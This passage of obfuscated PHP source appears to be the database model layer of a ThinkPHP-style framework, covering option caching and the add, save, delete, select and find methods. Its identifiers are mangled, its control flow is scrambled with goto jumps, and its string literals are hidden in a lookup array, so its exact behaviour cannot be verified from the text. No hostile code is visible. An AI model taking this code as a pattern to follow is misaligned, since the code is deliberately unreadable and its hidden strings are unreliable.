(!isset($eƒÁ…ĞÌğ¢[$eÒêîìÎ–Ü])) { return $eÒêîìÎ–Ü; } } return $eÒêîìÎ–Ü; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($cÇº¬„õ = false, $aŸ®µ¼¬´Ï = '', $aÑ±Ÿ»´ì = false) { goto cËñÊªìÊÜ; D¯Ö¡¥Óìê: $this->cacheSet($aŸ®µ¼¬´Ï, $C¾šÚî­Ê³); $C¾šÚî­Ê³ = array_merge($bç…Åí¨îä, $C¾šÚî­Ê³); return $cÇº¬„õ ? $C¾šÚî­Ê³[$cÇº¬„õ] : $C¾šÚî­Ê³; goto b™Ø²¡ª„°; AµğêŒšö: $bç…Åí¨îä = is_array($bç…Åí¨îä) ? $bç…Åí¨îä : array(); if (is_array($C¾šÚî­Ê³)) { $C¾šÚî­Ê³ = array_merge($bç…Åí¨îä, $C¾šÚî­Ê³); return $cÇº¬„õ ? isset($C¾šÚî­Ê³[$cÇº¬„õ]) ? $C¾šÚî­Ê³[$cÇº¬„õ] : null : $C¾šÚî­Ê³; } $D°Î”œç‹Ù = $this->filterWhere(array($EÃƒô»ë’Â[29] => $aŸ®µ¼¬´Ï)); goto D—ÕèŞÙ¹; D—ÕèŞÙ¹: $C¾šÚî­Ê³ = $this->where($D°Î”œç‹Ù)->select(); $C¾šÚî­Ê³ = array_to_keyvalue($C¾šÚî­Ê³, $EÃƒô»ë’Â[93], $EÃƒô»ë’Â[372]); foreach ($C¾šÚî­Ê³ as $Féòï¾›Ã => $eó÷˜ğååƒ) { if ($aÑ±Ÿ»´ì || in_array($Féòï¾›Ã, $this->jsonField)) { $C¾šÚî­Ê³[$Féòï¾›Ã] = json_decode($eó÷˜ğååƒ, !0); } } goto D¯Ö¡¥Óìê; cËñÊªìÊÜ: $EÃƒô»ë’Â =& $_SERVER[œº]; $C¾šÚî­Ê³ = $this->cacheGet($aŸ®µ¼¬´Ï); $bç…Åí¨îä = $this->optionDefault($aŸ®µ¼¬´Ï); goto AµğêŒšö; b™Ø²¡ª„°: } public function set($AÜ“îé—’, $e‹øš§Çƒ = false, $c–³œğôÈÌ = '') { goto cÑËÎ´ˆ®»; C…£Íˆí¢¸: return $this->addAll($EÕ¥Ò†‘Ã‹, array(), !0); goto BĞÎ’»ÄŠÊ; cÑËÎ´ˆ®»: $Aõàñ„Ü¦æ =& $_SERVER[œº]; $this->cacheRemove($c–³œğôÈÌ); $EÕ¥Ò†‘Ã‹ = array(); goto F‹èêìŒ; F‹èêìŒ: $FñèåÍå‹¡ = is_array($AÜ“îé—’) ? $AÜ“îé—’ : array($AÜ“îé—’ => $e‹øš§Çƒ); foreach ($FñèåÍå‹¡ as $D×À²”®¼¦ => $D®‚×©îĞï) { if (is_array($D®‚×©îĞï)) { $D®‚×©îĞï = json_encode_force($D®‚×©îĞï); } $this->checkLength($D®‚×©îĞï, !1, $this->tableName . $Aõàñ„Ü¦æ[4] . $AÜ“îé—’); $D®‚×©îĞï = self::textEncode($D®‚×©îĞï); $FñèåÍå‹¡ = array($Aõàñ„Ü¦æ[29] => $c–³œğôÈÌ, $Aõàñ„Ü¦æ[93] => $D×À²”®¼¦, $Aõàñ„Ü¦æ[372] => $D®‚×©îĞï); $EÕ¥Ò†‘Ã‹[] = $this->filterWhere($FñèåÍå‹¡); } if (!$EÕ¥Ò†‘Ã‹) { return !0; } goto C…£Íˆí¢¸; BĞÎ’»ÄŠÊ: } protected function optionDefault($e¨ËİĞ·í = '') { return !1; } public function setDeep($fƒÃ³¨š²œ, $DËó‡ºùÑ· = false, $cê‹àÇ±‘² = '') { $e¥ÌÍ°õÙè = explode($_SERVER[œº][95], $fƒÃ³¨š²œ); $CºùÈŞ¢Õù = $this->get(); array_set_value($CºùÈŞ¢Õù, $fƒÃ³¨š²œ, $DËó‡ºùÑ·); $this->set($e¥ÌÍ°õÙè[0], $CºùÈŞ¢Õù[$e¥ÌÍ°õÙè[0]], $cê‹àÇ±‘²); } public function remove($D®†ó¢ó‹ğ, $E”ÏùáÕõ§ = '') { $A×½Î  =& $_SERVER[œº]; $this->cacheRemove($E”ÏùáÕõ§); $dƒ‘ÆåÔë = $this->filterWhere(array($A×½Î [93] => $D®†ó¢ó‹ğ, $A×½Î [29] => $E”ÏùáÕõ§)); if (is_null($D®†ó¢ó‹ğ)) { unset($dƒ‘ÆåÔë[$A×½Î [93]]); } return $this->where($dƒ‘ÆåÔë)->delete(); } public function cacheSet($B‹ˆˆ®Ò·ì, $BŸ‡…íñÔÁ = false) { return Cache::set($this->cacheKey($B‹ˆˆ®Ò·ì), $BŸ‡…íñÔÁ); } public function cacheGet($DîÀôšÌË•) { return Cache::get($this->cacheKey($DîÀôšÌË•)); } public function cacheRemove($FÜ…ĞĞ”¶‹) { return Cache::remove($this->cacheKey($FÜ…ĞĞ”¶‹)); } protected function filterWhere($eìÛ†¯Åğ‡) { return $eìÛ†¯Åğ‡; } protected function cacheKey($DïÖˆ¨Ï¿ˆ) { return $DïÖˆ¨Ï¿ˆ; } } goto A²Óä«òÌİ; CĞ²Ş’‰: define($_SERVER[œº][240], 0); define($_SERVER[œº][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\145", "\157\x72\x64\145\162", "\x61\x6c\x69\141\163", "\150\141\x76\151\156\147", "\147\162\157\x75\x70", "\x6c\x6f\143\153", "\144\151\163\x74\x69\156\143\x74", "\141\165\x74\157", "\x66\151\x6c\x74\145\162", "\x76\x61\154\151\x64\x61\164\145", "\x72\x65\163\165\154\164", "\142\151\x6e\x64", "\164\x6f\x6b\145\x6e"); public function __construct($bäìƒ…Û¿¤ = '', $cÈßœ˜¼Û‚ = '', $eæÄèƒÌ = '') { $E¿§çñç =& $_SERVER[œº]; $this->_initialize(); if (!empty($bäìƒ…Û¿¤)) { if (strpos($bäìƒ…Û¿¤, $E¿§çñç[95])) { list($this->dbName, $this->name) = explode($E¿§çñç[95], $bäìƒ…Û¿¤); } else { $this->name = $bäìƒ…Û¿¤; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($cÈßœ˜¼Û‚)) { $this->tablePrefix = $E¿§çñç[33]; } elseif ($E¿§çñç[33] != $cÈßœ˜¼Û‚) { $this->tablePrefix = $cÈßœ˜¼Û‚; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($E¿§çñç[242]); } $this->db(0, empty($this->connection) ? $eæÄèƒÌ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $e¦ƒ˜ğµâŞ =& $_SERVER[œº]; if (empty($this->fields)) { if (think_config($e¦ƒ˜ğµâŞ[243])) { $Dîæ–ô»Ó™ = $this->dbName ? $this->dbName : think_config($e¦ƒ˜ğµâŞ[244]); $aª™›—¬  = think_var_cache($e¦ƒ˜ğµâŞ[245] . strtolower(get_path_this($Dîæ–ô»Ó™) . $e¦ƒ˜ğµâŞ[95] . $this->name)); if ($aª™›—¬ ) { $DÔ©†óÕÒ² = think_config($e¦ƒ˜ğµâŞ[246]); if (empty($DÔ©†óÕÒ²) || $aª™›—¬ [$e¦ƒ˜ğµâŞ[247]] == $DÔ©†óÕÒ²) { $this->fields = $aª™›—¬ ; return; } } } $this->flush(); } } public function flush() { goto D¹ê·Ëíê«; bùïÄ´îÔ: if (think_config($e§¬ÇØ‰Âí[243])) { $e©´Ñ‚°ó† = $this->dbName ? $this->dbName : think_config($e§¬ÇØ‰Âí[244]); think_var_cache($e§¬ÇØ‰Âí[245] . strtolower(get_path_this($e©´Ñ‚°ó†) . $e§¬ÇØ‰Âí[95] . $this->name), $this->fields); } goto c‚¨“¥ï; D¹ê·Ëíê«: $e§¬ÇØ‰Âí =& $_SERVER[œº]; $this->db->setModel($this->name); $eÕ—å½È· = $this->db->getFields($this->getTableName()); goto Fœ®ó†Ö”™; Då¿…‚©ÛŒ: foreach ($eÕ—å½È· as $BÛò”ø¦Ÿ => $d†§®ÄÂĞÎ) { $cÍÓîëï[$BÛò”ø¦Ÿ] = $d†§®ÄÂĞÎ[$e§¬ÇØ‰Âí[29]]; if ($d†§®ÄÂĞÎ[$e§¬ÇØ‰Âí[36]]) { $this->fields[$e§¬ÇØ‰Âí[249]] = $BÛò”ø¦Ÿ; if ($d†§®ÄÂĞÎ[$e§¬ÇØ‰Âí[39]]) { $this->fields[$e§¬ÇØ‰Âí[248]] = !0; } } } $this->fields[$e§¬ÇØ‰Âí[250]] = $cÍÓîëï; if (think_config($e§¬ÇØ‰Âí[246])) { $this->fields[$e§¬ÇØ‰Âí[247]] = think_config($e§¬ÇØ‰Âí[246]); } goto bùïÄ´îÔ; Fœ®ó†Ö”™: if (!$eÕ—å½È·) { return !1; } $this->fields = array_keys($eÕ—å½È·); $this->fields[$e§¬ÇØ‰Âí[248]] = !1; goto Då¿…‚©ÛŒ; c‚¨“¥ï: } public function switchModel($FÑõ÷ƒÎˆƒ, $FÒì™ŒĞ = array()) { $b”Û­­‰¯³ =& $_SERVER[œº]; $eáª»»ä°Œ = ucwords(strtolower($FÑõ÷ƒÎˆƒ)) . $b”Û­­‰¯³[251]; if (!class_exists($eáª»»ä°Œ)) { think_exception($eáª»»ä°Œ . think_lang($b”Û­­‰¯³[252])); } $this->_extModel = new $eáª»»ä°Œ($this->name); if (!empty($FÒì™ŒĞ)) { foreach ($FÒì™ŒĞ as $bèÌèÄ‰²) { $this->_extModel->setProperty($bèÌèÄ‰², $this->{$bèÌèÄ‰²}); } } return $this->_extModel; } public function __set($fî àÏ§† , $E‘°¿ù©ˆ) { $this->data[$fî àÏ§† ] = $E‘°¿ù©ˆ; } public function __get($aÂéù²¸) { return isset($this->data[$aÂéù²¸]) ? $this->data[$aÂéù²¸] : null; } public function __isset($C®†‚Ü×³›) { return isset($this->data[$C®†‚Ü×³›]); } public function __unset($aŸ¦ ¾ŒÂˆ) { unset($this->data[$aŸ¦ ¾ŒÂˆ]); } public function __call($fàìùÈœÓ, $a‰‰Ç¶¤ñ) { $aëçö‹³ =& $_SERVER[œº]; if (in_array(strtolower($fàìùÈœÓ), $this->methods, !0)) { $this->options[strtolower($fàìùÈœÓ)] = $a‰‰Ç¶¤ñ[0]; return $this; } elseif (in_array(strtolower($fàìùÈœÓ), array($aëçö‹³[253], $aëçö‹³[254], $aëçö‹³[255], $aëçö‹³[256], $aëçö‹³[257]), !0)) { $cÁº©¬â‰å = isset($a‰‰Ç¶¤ñ[0]) ? $a‰‰Ç¶¤ñ[0] : $aëçö‹³[182]; $cÁº©¬â‰å = $this->db->parseKey($cÁº©¬â‰å); return $this->getField(strtoupper($fàìùÈœÓ) . $aëçö‹³[258] . $cÁº©¬â‰å . $aëçö‹³[259] . $fàìùÈœÓ, $aëçö‹³[253]); } elseif (strtolower(substr($fàìùÈœÓ, 0, 5)) == $aëçö‹³[260]) { $cÁº©¬â‰å = think_parse_name(substr($fàìùÈœÓ, 5)); $dÂÍñ‡Ÿ¡[$cÁº©¬â‰å] = $a‰‰Ç¶¤ñ[0]; return $this->where($dÂÍñ‡Ÿ¡)->find(); } elseif (strtolower(substr($fàìùÈœÓ, 0, 10)) == $aëçö‹³[261]) { $a÷„Òˆ×¼ = think_parse_name(substr($fàìùÈœÓ, 10)); $dÂÍñ‡Ÿ¡[$a÷„Òˆ×¼] = $a‰‰Ç¶¤ñ[0]; return $this->where($dÂÍñ‡Ÿ¡)->getField($a‰‰Ç¶¤ñ[1]); } elseif (isset($this->_scope[$fàìùÈœÓ])) { return $this->scope($fàìùÈœÓ, $a‰‰Ç¶¤ñ[0]); } elseif (method_exists($this, $fàìùÈœÓ)) { array_unshift($a‰‰Ç¶¤ñ, $fàìùÈœÓ); return call_user_func_array(array($this, $aëçö‹³[262]), $a‰‰Ç¶¤ñ); } else { return call_user_func_array(array(parent, $fàìùÈœÓ), $a‰‰Ç¶¤ñ); } } protected function call() { goto dø æî¦ØÉ; d‚á‹Åš‹: $dÃ…ÉÔÙ¿´ = call_user_func_array(array($this, $b«²¥ïÕÊÒ), $AÈ‹˜Ø®”ˆ); if (method_exists($this, $E÷óİ²…½…[266])) { $d·©¿Ñ¾µ = call_user_func_array(array($this, $E÷óİ²…½…[267]), array($Eõ¡‹®¤Å, $AÈ‹˜Ø®”ˆ, $dÃ…ÉÔÙ¿´)); if ($d·©¿Ñ¾µ) { return $d·©¿Ñ¾µ; } } return $dÃ…ÉÔÙ¿´; goto cÏŞÖÈ…‚Ñ; DÇÄ™âÌà•: $Eõ¡‹®¤Å = $b«²¥ïÕÊÒ; if (is_array($b«²¥ïÕÊÒ)) { $Eõ¡‹®¤Å = $b«²¥ïÕÊÒ[1]; $b«²¥ïÕÊÒ = $b«²¥ïÕÊÒ[0]; } $Cè¥Ëà˜ˆø = count($AÈ‹˜Ø®”ˆ) - 1; goto D›Ú³¦ßºÔ; D›Ú³¦ßºÔ: if (isset($AÈ‹˜Ø®”ˆ[$Cè¥Ëà˜ˆø]) && $AÈ‹˜Ø®”ˆ[$Cè¥Ëà˜ˆø] === $b«²¥ïÕÊÒ) { think_exception(__CLASS__ . $E÷óİ²…½…[4] . $b«²¥ïÕÊÒ . think_lang($E÷óİ²…½…[263])); return; } $AÈ‹˜Ø®”ˆ[] = $b«²¥ïÕÊÒ; if (method_exists($this, $E÷óİ²…½…[264])) { $d·©¿Ñ¾µ = call_user_func_array(array($this, $E÷óİ²…½…[265]), array($Eõ¡‹®¤Å, $AÈ‹˜Ø®”ˆ)); if (!is_null($d·©¿Ñ¾µ) && $d·©¿Ñ¾µ !== !1) { return $d·©¿Ñ¾µ; } } goto d‚á‹Åš‹; dø æî¦ØÉ: $E÷óİ²…½… =& $_SERVER[œº]; $AÈ‹˜Ø®”ˆ = func_get_args(); $b«²¥ïÕÊÒ = array_shift($AÈ‹˜Ø®”ˆ); goto DÇÄ™âÌà•; cÏŞÖÈ…‚Ñ: } protected function _initialize() { } protected function _facade($aÓ£ŒëÁŒ) { $dî«¦ã˜µè =& $_SERVER[œº]; if (!empty($this->fields)) { foreach ($aÓ£ŒëÁŒ as $D©î¬‰°Î => $bÃ¸¾‚•ŸÄ) { if (is_array($this->fields) && !in_array($D©î¬‰°Î, $this->fields, !0)) { unset($aÓ£ŒëÁŒ[$D©î¬‰°Î]); } elseif (is_scalar($bÃ¸¾‚•ŸÄ)) { $this->_parseType($aÓ£ŒëÁŒ, $D©î¬‰°Î); } } } if (!empty($this->options[$dî«¦ã˜µè[268]])) { $aÓ£ŒëÁŒ = array_map($this->options[$dî«¦ã˜µè[268]], $aÓ£ŒëÁŒ); unset($this->options[$dî«¦ã˜µè[268]]); } $this->_beforeWrite($aÓ£ŒëÁŒ); return $aÓ£ŒëÁŒ; } protected function _beforeWrite(&$c’Ìë‘çŞÃ) { } public function add($Dàª§’Ò¯ = '', $BÆ……íÊäÙ = array(), $D¼Âî´Òù– = false) { goto AÊ÷Œ£‰òä; AÊ÷Œ£‰òä: if (empty($Dàª§’Ò¯)) { if (!empty($this->data)) { $Dàª§’Ò¯ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[œº][269]); return !1; } } $BÆ……íÊäÙ = $this->_parseOptions($BÆ……íÊäÙ); $Dàª§’Ò¯ = $this->_facade($Dàª§’Ò¯); goto Eèšö¢åì¸; Eèšö¢åì¸: if (!1 === $this->_beforeInsert($Dàª§’Ò¯, $BÆ……íÊäÙ)) { return !1; } $e°İßƒ›Ù = $this->db->insert($Dàª§’Ò¯, $BÆ……íÊäÙ, $D¼Âî´Òù–); if (!1 !== $e°İßƒ›Ù) { $b„ß‹Ò°²¦ = $this->getLastInsID(); if ($b„ß‹Ò°²¦) { $Dàª§’Ò¯[$this->getPk()] = $b„ß‹Ò°²¦; $this->_after_insert($Dàª§’Ò¯, $BÆ……íÊäÙ); return $b„ß‹Ò°²¦; } $this->_after_insert($Dàª§’Ò¯, $BÆ……íÊäÙ); } goto AÃ¿¯»ÄãÜ; AÃ¿¯»ÄãÜ: return $e°İßƒ›Ù; goto D“¶Ù¤Ö ğ; D“¶Ù¤Ö ğ: } protected function _beforeInsert(&$c·ÃğÇÏ, $d‰‡°ãÙ‘) { } protected function _after_insert($CÑŞ’íØ…ƒ, $E„ê—Ô¤õÜ) { } public function addAll($bôÛ˜öí‹, $båš¾Ä áó = array(), $e´ªÆàŠœ† = false) { goto bÒâòñíˆ; F®Í›ÈÒÆİ: foreach ($bôÛ˜öí‹ as $eö‡Æ¥ó°ï => $a³Óõäë) { $bôÛ˜öí‹[$eö‡Æ¥ó°ï] = $this->_facade($a³Óõäë); } if (method_exists($this->db, $Fß„ãÅñò…[270])) { $fØÎ´‘ˆôø = $this->db->insertAll($bôÛ˜öí‹, $båš¾Ä áó, $e´ªÆàŠœ†); } else { $this->startTrans(); foreach ($bôÛ˜öí‹ as $eö‡Æ¥ó°ï => $a³Óõäë) { $fØÎ´‘ˆôø = $this->db->insert($a³Óõäë, $båš¾Ä áó, $e´ªÆàŠœ†); } $this->commit(); } if (!1 !== $fØÎ´‘ˆôø) { $dø¿ñíœÃ = $this->getLastInsID(); if ($dø¿ñíœÃ) { return $dø¿ñíœÃ; } } goto f•‘Ò¡´ã™; bÒâòñíˆ: $Fß„ãÅñò… =& $_SERVER[œº]; if (empty($bôÛ˜öí‹)) { $this->error = think_lang($Fß„ãÅñò…[269]); return !1; } $båš¾Ä áó = $this->_parseOptions($båš¾Ä áó); goto F®Í›ÈÒÆİ; f•‘Ò¡´ã™: return $fØÎ´‘ˆôø; goto C¹•ËÆˆøƒ; C¹•ËÆˆøƒ: } public function selectAdd($b•¼Â¶—ëê = '', $a“ŞÂïä¾ª = '', $CÊ×§›‚ = array()) { $a‚¾Ü˜“‰“ =& $_SERVER[œº]; $CÊ×§›‚ = $this->_parseOptions($CÊ×§›‚); if (!1 === ($c²¤Ä–ù™É = $this->db->selectInsert($b•¼Â¶—ëê ? $b•¼Â¶—ëê : $CÊ×§›‚[$a‚¾Ü˜“‰“[271]], $a“ŞÂïä¾ª ? $a“ŞÂïä¾ª : $this->getTableName(), $CÊ×§›‚))) { $this->error = think_lang($a‚¾Ü˜“‰“[272]); return !1; } else { return $c²¤Ä–ù™É; } } public function save($a Ü”ÖŞ‡ä = '', $d’êÆÏµ‰² = array()) { goto c¦¨Ğâª; d¨Ğø½ª—¡: $d’êÆÏµ‰² = $this->_parseOptions($d’êÆÏµ‰²); $EÕ’ö×¢Îô = $this->getPk(); if (!isset($d’êÆÏµ‰²[$e…‰×çŒÅ§[273]])) { if (isset($a Ü”ÖŞ‡ä[$EÕ’ö×¢Îô])) { $e½ƒ²‡°ÅÉ[$EÕ’ö×¢Îô] = $a Ü”ÖŞ‡ä[$EÕ’ö×¢Îô]; $d’êÆÏµ‰²[$e…‰×çŒÅ§[273]] = $e½ƒ²‡°ÅÉ; unset($a Ü”ÖŞ‡ä[$EÕ’ö×¢Îô]); } else { $this->error = think_lang($e…‰×çŒÅ§[272]); return !1; } } goto eÕƒ¼¸²Ç; eÕƒ¼¸²Ç: if (is_array($d’êÆÏµ‰²[$e…‰×çŒÅ§[273]]) && isset($d’êÆÏµ‰²[$e…‰×çŒÅ§[273]][$EÕ’ö×¢Îô])) { $B¡øÔ®¢¬ = $d’êÆÏµ‰²[$e…‰×çŒÅ§[273]][$EÕ’ö×¢Îô]; } if (!1 === $this->_beforeUpdate($a Ü”ÖŞ‡ä, $d’êÆÏµ‰²)) { return !1; } $B÷ó†¯İµ° = $this->db->update($a Ü”ÖŞ‡ä, $d’êÆÏµ‰²); goto B÷Ğ„³øš°; B÷Ğ„³øš°: if (!1 !== $B÷ó†¯İµ°) { if (isset($B¡øÔ®¢¬)) { $a Ü”ÖŞ‡ä[$EÕ’ö×¢Îô] = $B¡øÔ®¢¬; } $this->_afterUpdate($a Ü”ÖŞ‡ä, $d’êÆÏµ‰²); } return $B÷ó†¯İµ°; goto c„×é±õ¾; c¦¨Ğâª: $e…‰×çŒÅ§ =& $_SERVER[œº]; if (empty($a Ü”ÖŞ‡ä)) { if (!empty($this->data)) { $a Ü”ÖŞ‡ä = $this->data; $this->data = array(); } else { $this->error = think_lang($e…‰×çŒÅ§[269]); return !1; } } $a Ü”ÖŞ‡ä = $this->_facade($a Ü”ÖŞ‡ä); goto d¨Ğø½ª—¡; c„×é±õ¾: } protected function _beforeUpdate(&$DøğÛóíİ, $f™ÛïÀ…Ôå) { } protected function _afterUpdate($f¤ĞêööŒ…, $c×Ççç•Å) { } public function delete($FÙ¿‘Şëˆ› = array()) { goto c½î‹ºñÎ; FìŞóéÕí”: if (is_numeric($FÙ¿‘Şëˆ›) || is_string($FÙ¿‘Şëˆ›)) { if (strpos($FÙ¿‘Şëˆ›, $EÅ“Êª·Ùœ[47])) { $CÖÁ¯ñ©Ã‹[$AÅ•¤ˆíÖˆ] = array($EÅ“Êª·Ùœ[274], $FÙ¿‘Şëˆ›); } else { $CÖÁ¯ñ©Ã‹[$AÅ•¤ˆíÖˆ] = $FÙ¿‘Şëˆ›; } $this->options[$EÅ“Êª·Ùœ[273]] = $CÖÁ¯ñ©Ã‹; } $FÙ¿‘Şëˆ› = $this->_parseOptions(); if (is_array($FÙ¿‘Şëˆ›[$EÅ“Êª·Ùœ[273]]) && isset($FÙ¿‘Şëˆ›[$EÅ“Êª·Ùœ[273]][$AÅ•¤ˆíÖˆ])) { $D·¸¥Ëğƒ = $FÙ¿‘Şëˆ›[$EÅ“Êª·Ùœ[273]][$AÅ•¤ˆíÖˆ]; } goto AË¥“šÒÓ; c½î‹ºñÎ: $EÅ“Êª·Ùœ =& $_SERVER[œº]; if (empty($FÙ¿‘Şëˆ›) && empty($this->options[$EÅ“Êª·Ùœ[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $AÅ•¤ˆíÖˆ = $this->getPk(); goto FìŞóéÕí”; AË¥“šÒÓ: $f§îÁ«æ = $this->db->delete($FÙ¿‘Şëˆ›); if (!1 !== $f§îÁ«æ) { $A’ŒçääŞñ = array(); if (isset($D·¸¥Ëğƒ)) { $A’ŒçääŞñ[$AÅ•¤ˆíÖˆ] = $D·¸¥Ëğƒ; } $this->_after_delete($A’ŒçääŞñ, $FÙ¿‘Şëˆ›); } return $f§îÁ«æ; goto Bó¾Èä¹Ë×; Bó¾Èä¹Ë×: } protected function _after_delete($eã»ä²ë…, $A™ÈÁÚïÚ) { } public function select($F«Œ›„¬Ç = array()) { goto Fòê˜ˆ©Ê‡; F’©˜á½‘¨: $FÖ”ê‡¦Ö = $this->db->select($F«Œ›„¬Ç); if (!1 === $FÖ”ê‡¦Ö) { return !1; } if (empty($FÖ”ê‡¦Ö)) { return null; } goto EĞƒ²ëÀã‰; Fòê˜ˆ©Ê‡: $cÔïÌëö—µ =& $_SERVER[œº]; if (is_string($F«Œ›„¬Ç) || is_numeric($F«Œ›„¬Ç)) { $d‘”éÓ‡¤ƒ = $this->getPk(); if (strpos($F«Œ›„¬Ç, $cÔïÌëö—µ[47])) { $c³¿š‘—‘Ô[$d‘”éÓ‡¤ƒ] = array($cÔïÌëö—µ[274], $F«Œ›„¬Ç); } else { $c³¿š‘—‘Ô[$d‘”éÓ‡¤ƒ] = $F«Œ›„¬Ç; } $this->options[$cÔïÌëö—µ[273]] = $c³¿š‘—‘Ô; } elseif (!1 === $F«Œ›„¬Ç) { $F«Œ›„¬Ç = $this->_parseOptions(); return $cÔïÌëö—µ[275] . $this->db->buildSelectSql($F«Œ›„¬Ç) . $cÔïÌëö—µ[276]; } $F«Œ›„¬Ç = $this->_parseOptions(); goto F’©˜á½‘¨; EĞƒ²ëÀã‰: $this->_afterSelect($FÖ”ê‡¦Ö, $F«Œ›„¬Ç); return $FÖ”ê‡¦Ö; goto aÀªÅ¯»æÁ; aÀªÅ¯»æÁ: } protected function _afterSelect(&$E» ´ÅÂŠ•, $f¦‹›¸ëÉ) { } public function buildSql($d„…ÕÛôß = array()) { $dÂÕîÀºµ =& $_SERVER[œº]; $d„…ÕÛôß = $this->_parseOptions($d„…ÕÛôß); return $dÂÕîÀºµ[275] . $this->db->buildSelectSql($d„…ÕÛôß) . $dÂÕîÀºµ[276]; } public function optionsValue($fñØíÓîÇ§ = null) { if (is_null($fñØíÓîÇ§)) { return $this->options; } elseif (is_array($fñØíÓîÇ§)) { $this->options = array_merge($this->options, $fñØíÓîÇ§); } } protected function _parseOptions($Aê­–¢¼‹ = array()) { goto AìÅÚ®ôÌ®; DÒ¥„Î÷Õá: if (!isset($Aê­–¢¼‹[$EĞˆ‚‘‡µó[277]])) { $Aê­–¢¼‹[$EĞˆ‚‘‡µó[277]] = $this->getTableName(); $eŠŒšôöï° = $this->fields; } else { $eŠŒšôöï° = $this->getDbFields(); } if (!empty($Aê­–¢¼‹[$EĞˆ‚‘‡µó[278]])) { $Aê­–¢¼‹[$EĞˆ‚‘‡µó[277]] .= $EĞˆ‚‘‡µó[50] . $Aê­–¢¼‹[$EĞˆ‚‘‡µó[278]]; } $Aê­–¢¼‹[$EĞˆ‚‘‡µó[279]] = $this->name; goto DÙŒâÙÈĞ; AìÅÚ®ôÌ®: $EĞˆ‚‘‡µó =& $_SERVER[œº]; if (is_array($Aê­–¢¼‹)) { $Aê­–¢¼‹ = array_merge($this->options, $Aê­–¢¼‹); } $this->options = array(); goto DÒ¥„Î÷Õá; DÙŒâÙÈĞ: if (isset($Aê­–¢¼‹[$EĞˆ‚‘‡µó[273]]) && is_array($Aê­–¢¼‹[$EĞˆ‚‘‡µó[273]]) && !empty($eŠŒšôöï°) && !isset($Aê­–¢¼‹[$EĞˆ‚‘‡µó[280]]) && !isset($Aê­–¢¼‹[$EĞˆ‚‘‡µó[277]])) { foreach ($Aê­–¢¼‹[$EĞˆ‚‘‡µó[273]] as $E„™«ñØ => $dîå†Ô«ï¸) { $E„™«ñØ = trim($E„™«ñØ); if (in_array($E„™«ñØ, $eŠŒšôöï°, !0)) { if (is_scalar($dîå†Ô«ï¸)) { $this->_parseType($Aê­–¢¼‹[$EĞˆ‚‘‡µó[273]], $E„™«ñØ); } } elseif (!is_numeric($E„™«ñØ) && $EĞˆ‚‘‡µó[71] != substr($E„™«ñØ, 0, 1) && !1 === strpos($E„™«ñØ, $EĞˆ‚‘‡µó[95]) && !1 === strpos($E„™«ñØ, $EĞˆ‚‘‡µó[258]) && !1 === strpos($E„™«ñØ, $EĞˆ‚‘‡µó[281]) && !1 === strpos($E„™«ñØ, $EĞˆ‚‘‡µó[282])) { unset($Aê­–¢¼‹[$EĞˆ‚‘‡µó[273]][$E„™«ñØ]); } } } $this->_options_filter($Aê­–¢¼‹); return $Aê­–¢¼‹; goto a¾‘ï´›ß°; a¾‘ï´›ß°: } protected function _options_filter(&$fÚ¯†×æ¸ù) { } protected function _parseType(&$eò²ÊÁ²ÍÒ, $bŒ›Â©‚ğ¿) { $DÕ”×ˆŠ±„ =& $_SERVER[œº]; if (empty($this->options[$DÕ”×ˆŠ±„[283]][$DÕ”×ˆŠ±„[4] . $bŒ›Â©‚ğ¿])) { $Aé½è„Ôƒ© = strtolower($this->fields[$DÕ”×ˆŠ±„[250]][$bŒ›Â©‚ğ¿]); if (!1 !== strpos($Aé½è„Ôƒ©, $DÕ”×ˆŠ±„[284])) { } elseif (!1 === strpos($Aé½è„Ôƒ©, $DÕ”×ˆŠ±„[285]) && !1 !== strpos($Aé½è„Ôƒ©, $DÕ”×ˆŠ±„[286])) { $eò²ÊÁ²ÍÒ[$bŒ›Â©‚ğ¿] = intval($eò²ÊÁ²ÍÒ[$bŒ›Â©‚ğ¿]); } elseif (!1 !== strpos($Aé½è„Ôƒ©, $DÕ”×ˆŠ±„[287]) || !1 !== strpos($Aé½è„Ôƒ©, $DÕ”×ˆŠ±„[288])) { $eò²ÊÁ²ÍÒ[$bŒ›Â©‚ğ¿] = floatval($eò²ÊÁ²ÍÒ[$bŒ›Â©‚ğ¿]); } elseif (!1 !== strpos($Aé½è„Ôƒ©, $DÕ”×ˆŠ±„[289])) { $eò²ÊÁ²ÍÒ[$bŒ›Â©‚ğ¿] = (bool) $eò²ÊÁ²ÍÒ[$bŒ›Â©‚ğ¿]; } } } public function find($E¢²òĞ‹¤Ü = array()) { goto CÙïÏ‰‡­; CÙïÏ‰‡­: $e¨ÛÚ‚‡å‹ =& $_SERVER[œº]; if (is_numeric($E¢²òĞ‹¤Ü) || is_string($E¢²òĞ‹¤Ü)) { $E‰ÄÇ¾ó‡[$this->getPk()] = intval($E¢²òĞ‹¤Ü); $this->options[$e¨ÛÚ‚‡å‹[273]] = $E‰ÄÇ¾ó‡; } $this->options[$e¨ÛÚ‚‡å‹[290]] = 1; goto C°‹´ÍåÆ¤; c§¼“ÛÌËÍ: if (empty($F‚½ŸòœŸ)) { return null; } $this->data = $F‚½ŸòœŸ[0]; $this->_afterFind($this->data, $E¢²òĞ‹¤Ü); goto a³Ú½«Ø‘; C°‹´ÍåÆ¤: $E¢²òĞ‹¤Ü = $this->_parseOptions(); $F‚½ŸòœŸ = $this->db->select($E¢²òĞ‹¤Ü); if (!1 === $F‚½ŸòœŸ) { return !1; } goto c§¼“ÛÌËÍ; a³Ú½«Ø‘: if (!empty($this->options[$e¨ÛÚ‚‡å‹[291]])) { return $this->returnResult($this->data, $this->options[$e¨ÛÚ‚‡å‹[291]]); } return $this->data; goto 